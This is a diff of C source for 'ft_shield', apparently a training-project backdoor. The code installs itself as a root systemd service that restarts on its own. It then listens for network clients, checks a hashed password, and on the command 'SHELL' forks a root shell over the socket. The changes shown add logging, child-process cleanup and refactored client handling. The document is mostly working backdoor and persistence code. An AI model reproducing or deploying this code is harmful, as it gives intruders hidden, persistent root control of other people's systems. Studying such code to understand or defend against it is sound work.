@@ -1,4 +1,3 @@
-char arr[10];
 #include <stdbool.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -28,8 +27,10 @@ char service_path[] = "/etc/systemd/system/ft_shield.service";
 char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nWorkingDirectory=/bin\nExecStart=/bin/ft_shield\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
 char cmd[1000];
 char filePath[600];
-
-
+int dbg; 
+void dbg_msg(char *msg){
+	write(dbg, msg, strlen(msg));
+}
 
 unsigned long hash(char *str){
     unsigned long h = 5381;
@@ -239,18 +240,13 @@ typedef struct server {
 
 t_server server;
 
-char new_conn_dbg[] = "new connection\n";
-char dbg_start[] = "server_started\n";
-char new_conn_faill[] = "fail connection\n";
-char dbg_by[] = "connection closed\n";
-char dbg_msg[] = "msg received :\n";
-char dbg_pass[] = "valid password:\n";
 unsigned long password= 15089076065643833894lu;
 
 bool add_client(int fd){
 	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
 		if (server.fds[i].fd == -1){
-			server.fds[i] = (struct pollfd){fd,  POLLIN};
+			server.fds[i].fd = fd;
+			server.fds[i].events = POLLIN;
 			return true;
 		}
 	}
@@ -278,6 +274,15 @@ bool is_client_auth(int fd){
 	return false;
 }
 
+bool client_running_shell(int fd){
+
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		if (server.cl[i].fd == fd && server.cl[i].auth == true && server.cl[i].pid != -1)
+			return true;
+	}
+	return false;
+}
+
 bool authenticate_client(int fd){
 
 	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
@@ -293,7 +298,6 @@ bool authenticate_client(int fd){
 bool add_pid_to_auth_client(int fd, pid_t pid){
 
 	// close fd from the main process we don't need it 
-	close(fd);
 	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
 		if (server.cl[i].fd == fd && server.cl[i].auth){
 			server.cl[i].pid = pid;
@@ -305,6 +309,8 @@ bool add_pid_to_auth_client(int fd, pid_t pid){
 
 
 
+
+
 void remove_client(int fd){
 
 	close(fd);
@@ -313,6 +319,17 @@ void remove_client(int fd){
 			server.fds[i].fd = - 1;
 		}
 	}
+	// check if client has a process and kill it
+	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
+		if (server.cl[i].pid != -1 && server.cl[i].fd == fd){
+ 				if (kill(server.cl[i].pid, SIGKILL) == -1)
+					exit(EXIT_FAILURE);
+				if (waitpid(server.cl[i].pid, NULL,0 ) == -1)
+					exit(EXIT_FAILURE);
+				dbg_msg("a user process quite \n");
+		}
+	}
+
 	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
 		if (server.cl[i].fd == fd){
 			server.cl[i].fd = -1;
@@ -353,7 +370,10 @@ pid_t reverse_shell(int fd){
 
 
 
+
+
 void init_server(){
+	dbg = open("/tmp/ft_shield_logs", O_RDWR |O_TRUNC | O_CREAT);
 	for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
 		server.fds[i].fd  = -1;
 		server.fds[i].events  = 0;
@@ -375,31 +395,19 @@ void init_server(){
 
 
 void monitor_processes(){
-	for (int i = 0; i < sizeof(server.cl) / sizeof(t_client); i++){
-
-		// a process exited
-		if (server.cl[i].pid != -1 && waitpid(server.cl[i].pid, NULL, WNOHANG) != 0){
-			remove_client(server.cl[i].fd);
-		}
-	}
 }
 
 
 void server_reverse_shell(){
-	init_server();
-	// dbug purpose
-	int dbg = open("/tmp/ft_shield.log", O_TRUNC | O_CREAT | O_RDWR);
-	if (dbg < 0)
-		exit(1);
 	
-	// set the whole array to zero
+	init_server();
 	
 
-	write(dbg ,dbg_start, sizeof(dbg_start));
 	while (true){
 		if (poll(server.fds, sizeof(server.fds) / sizeof(struct pollfd), -1) < 0)
 			exit(0);
 
+		monitor_processes();
 		for (int i = 0; i < sizeof(server.fds) / sizeof(struct pollfd); i++){
 			if (!(server.fds[i].revents & POLLIN) || server.fds[i].fd == -1)
 				continue;
@@ -411,9 +419,9 @@ void server_reverse_shell(){
 					continue;
 				if (!add_client(client_fd)){
 					close(client_fd);
-					write(dbg ,new_conn_faill, sizeof(new_conn_faill));
 					continue;
 				}
+				dbg_msg("new connection\n");
 			}
 			else {
 				// client need to provide password  
@@ -422,14 +430,19 @@ void server_reverse_shell(){
 				if (n <= 0){
 					// remove client
 					remove_client(client_fd);
-					write(dbg ,dbg_by, sizeof(dbg_by));
 					continue;
 				}
 				cmd[n - 1]  = '\0';
 				//if user authenticated 
 				if (is_client_auth(client_fd)){
-					if (strcmp("SHELL", cmd) == 0){
+					if (client_running_shell(client_fd)){
+						recv(client_fd, cmd, 100, 0);
+					}else if (strcmp("SHELL", cmd) == 0){
+
+						dbg_msg("user want to run shell\n");
+						// fork a process
 						pid_t pid = reverse_shell(client_fd);
+						// close fd in parent process
 						add_pid_to_auth_client(client_fd, pid);
 					}else{
 						char *msg = "SHELL to get access to the shell as root users\n";
@@ -439,10 +452,11 @@ void server_reverse_shell(){
 				else {
 					// not authenticated and invalid password
 					if (!valid_password(cmd)){
+						dbg_msg("Invalid password\n");
 						char *msg = "Invalid password\n";
-						write(dbg ,dbg_pass, sizeof(dbg_pass));
 						alert_client(client_fd, msg , strlen(msg));
 					}else{
+						dbg_msg("user is authenticated\n");
 						char *msg = "You are authenticated\nWelcom to your reverse shell\n";
 						alert_client(client_fd, msg , strlen(msg));
 						authenticate_client(client_fd);
@@ -450,7 +464,6 @@ void server_reverse_shell(){
 				}
 			}
 		}
-		monitor_processes();
 	}
 }
 
